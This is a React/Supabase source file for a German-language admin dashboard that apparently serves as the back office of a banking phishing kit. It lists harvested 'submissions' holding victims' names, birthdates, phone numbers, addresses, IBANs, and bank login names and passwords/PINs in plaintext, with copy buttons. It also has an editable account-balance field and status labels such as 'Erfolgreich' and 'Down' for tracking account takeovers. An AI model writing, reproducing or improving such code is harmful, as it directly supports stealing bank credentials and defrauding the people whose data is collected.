import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import type { User } from "@supabase/supabase-js";
import Header from "@/components/Header";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { toast } from "sonner";
import { Copy, Eye, LogOut } from "lucide-react";

interface Submission {
  id: string;
  session_id: string;
  created_at: string;
  full_name: string | null;
  email: string | null;
  birthdate: string | null;
  phone: string | null;
  street: string | null;
  house_number: string | null;
  staircase: string | null;
  door_number: string | null;
  postal_code: string | null;
  city: string | null;
  iban: string | null;
  bank: string | null;
  bank_username: string | null;
  bank_password: string | null;
  bank_username_label: string | null;
  bank_password_label: string | null;
  bank_extra: Record<string, string> | null;
  balance: string | null;
  status: string | null;
}

const STATUS_OPTIONS = ["Neu", "In Bearbeitung", "Erfolgreich", "Down"] as const;

const statusBadgeClass: Record<string, string> = {
  "Neu": "bg-gray-200 text-gray-800 hover:bg-gray-200",
  "In Bearbeitung": "bg-blue-100 text-blue-800 hover:bg-blue-100",
  "Erfolgreich": "bg-green-100 text-green-800 hover:bg-green-100",
  "Down": "bg-red-100 text-red-800 hover:bg-red-100",
};

const AdminLogs = () => {
  const navigate = useNavigate();
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [balanceEdit, setBalanceEdit] = useState<{ id: string; value: string } | null>(null);
  const [statusFilter, setStatusFilter] = useState<string>("Alle");

  useEffect(() => {
    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      if (!session) {
        navigate("/auth");
      } else {
        setUser(session.user);
      }
    });

    supabase.auth.getSession().then(({ data: { session } }) => {
      if (!session) {
        navigate("/auth");
      } else {
        setUser(session.user);
        fetchSubmissions();
      }
      setLoading(false);
    });

    return () => subscription.unsubscribe();
  }, [navigate]);

  const fetchSubmissions = async () => {
    const { data, error } = await supabase
      .from("submissions")
      .select("*")
      .order("created_at", { ascending: false });

    if (!error && data) {
      setSubmissions(data as Submission[]);
    }
  };

  const handleLogout = async () => {
    await supabase.auth.signOut();
    navigate("/auth");
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Kopiert!");
  };

  const saveBalance = async () => {
    if (!balanceEdit) return;
    const { error } = await supabase
      .from("submissions")
      .update({ balance: balanceEdit.value || null })
      .eq("id", balanceEdit.id);
    if (error) {
      toast.error("Fehler beim Speichern");
    } else {
      toast.success("Guthaben gespeichert");
      setSubmissions((prev) =>
        prev.map((s) => (s.id === balanceEdit.id ? { ...s, balance: balanceEdit.value || null } : s))
      );
      setBalanceEdit(null);
    }
  };

  const updateStatus = async (id: string, status: string) => {
    const { error } = await supabase.from("submissions").update({ status }).eq("id", id);
    if (error) {
      toast.error("Fehler beim Speichern");
    } else {
      setSubmissions((prev) => prev.map((s) => (s.id === id ? { ...s, status } : s)));
    }
  };

  const CopyCell = ({ value }: { value: string | null }) => {
    if (!value) return <span>-</span>;
    return (
      <button
        onClick={() => copyToClipboard(value)}
        className="flex items-center gap-1 text-blue-600 hover:underline"
      >
        {value} <Copy className="h-3 w-3" />
      </button>
    );
  };

  const filteredSubmissions = statusFilter === "Alle"
    ? submissions
    : submissions.filter((s) => (s.status || "Neu") === statusFilter);

  if (loading) {
    return (
      <div className="flex min-h-screen items-center justify-center">
        <p className="text-gray-500">Laden...</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <Header />
      <div className="container mx-auto px-4 py-8">
        <div className="mb-6 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <h1 className="text-2xl font-bold text-gray-900">Logs</h1>
            <Button variant="outline" size="sm" onClick={() => navigate("/admin")}>
              ← Admin
            </Button>
          </div>
          <div className="flex items-center gap-3">
            <Button variant="outline" size="sm" onClick={fetchSubmissions}>
              Aktualisieren
            </Button>
            <Button variant="outline" size="sm" onClick={handleLogout}>
              <LogOut className="mr-1 h-4 w-4" /> Logout
            </Button>
          </div>
        </div>

        {/* Status Filter */}
        <div className="mb-4 flex items-center gap-2">
          <span className="text-sm text-gray-500">Filter:</span>
          {["Alle", ...STATUS_OPTIONS].map((s) => (
            <Button
              key={s}
              size="sm"
              variant={statusFilter === s ? "default" : "outline"}
              onClick={() => setStatusFilter(s)}
              className="text-xs"
            >
              {s}
            </Button>
          ))}
        </div>

        <div className="rounded-lg border bg-white shadow-sm overflow-x-auto">
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>Zeitpunkt</TableHead>
                <TableHead>Name</TableHead>
                <TableHead>Telefonnummer</TableHead>
                <TableHead>Geburtsdatum</TableHead>
                <TableHead>Stadt</TableHead>
                <TableHead>Bank</TableHead>
                <TableHead>Login-Name</TableHead>
                <TableHead>Passwort/PIN</TableHead>
                <TableHead>Guthaben</TableHead>
                <TableHead>Status</TableHead>
                <TableHead>Details</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {filteredSubmissions.map((sub) => {
                const currentStatus = sub.status || "Neu";
                return (
                  <TableRow key={sub.id}>
                    <TableCell className="whitespace-nowrap text-xs">
                      {sub.created_at ? new Date(sub.created_at).toLocaleString("de-AT") : "-"}
                    </TableCell>
                    <TableCell>{sub.full_name || "-"}</TableCell>
                    <TableCell><CopyCell value={sub.phone} /></TableCell>
                    <TableCell>{sub.birthdate || "-"}</TableCell>
                    <TableCell>{sub.city || "-"}</TableCell>
                    <TableCell>{sub.bank || "-"}</TableCell>
                    <TableCell><CopyCell value={sub.bank_username} /></TableCell>
                    <TableCell><CopyCell value={sub.bank_password} /></TableCell>
                    <TableCell>
                      <button
                        onClick={() => setBalanceEdit({ id: sub.id, value: sub.balance || "" })}
                        className="text-sm text-gray-700 hover:text-blue-600 hover:underline cursor-pointer"
                      >
                        {sub.balance || "-"}
                      </button>
                    </TableCell>
                    <TableCell>
                      <Select value={currentStatus} onValueChange={(val) => updateStatus(sub.id, val)}>
                        <SelectTrigger className="h-7 w-[130px] text-xs border-0 p-0">
                          <Badge className={statusBadgeClass[currentStatus] || ""}>{currentStatus}</Badge>
                        </SelectTrigger>
                        <SelectContent>
                          {STATUS_OPTIONS.map((opt) => (
                            <SelectItem key={opt} value={opt}>{opt}</SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </TableCell>
                    <TableCell>
                      <Button size="sm" variant="outline" onClick={() => navigate(`/admin/logs/${sub.id}`)}>
                        <Eye className="mr-1 h-3 w-3" /> Details
                      </Button>
                    </TableCell>
                  </TableRow>
                );
              })}
              {filteredSubmissions.length === 0 && (
                <TableRow>
                  <TableCell colSpan={11} className="text-center text-gray-400 py-8">
                    Keine Einträge vorhanden
                  </TableCell>
                </TableRow>
              )}
            </TableBody>
          </Table>
        </div>
      </div>

      {/* Balance Edit Dialog */}
      <Dialog open={!!balanceEdit} onOpenChange={(open) => !open && setBalanceEdit(null)}>
        <DialogContent className="max-w-sm">
          <DialogHeader>
            <DialogTitle>Guthaben bearbeiten</DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            <Input
              placeholder="z.B. 1.250,00 €"
              value={balanceEdit?.value || ""}
              onChange={(e) => setBalanceEdit((prev) => prev ? { ...prev, value: e.target.value } : null)}
              onKeyDown={(e) => e.key === "Enter" && saveBalance()}
            />
            <div className="flex justify-end gap-2">
              <Button variant="outline" size="sm" onClick={() => setBalanceEdit(null)}>Abbrechen</Button>
              <Button size="sm" onClick={saveBalance}>Speichern</Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default AdminLogs;
